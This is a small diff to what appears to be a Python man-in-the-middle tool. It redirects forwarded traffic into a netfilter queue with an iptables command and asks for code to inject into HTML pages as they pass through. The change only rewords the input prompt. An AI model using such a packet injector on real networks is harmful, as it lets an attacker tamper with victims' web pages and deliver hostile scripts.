@@ -45,7 +45,7 @@ def mpack(packet, load):
     del packet[sc.TCP].chksum
     return packet
 subprocess.call("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
-userval = input("[Required] --> Please Enter the code to be injected in HTML pages: ")
+userval = input("[Required] --> Please paste the code to be injected in HTML pages: ")
 def packinjector(packet):
     spacket =sc.IP(packet.get_payload())
     if spacket.haslayer(sc.Raw) and spacket.haslayer(sc.TCP):
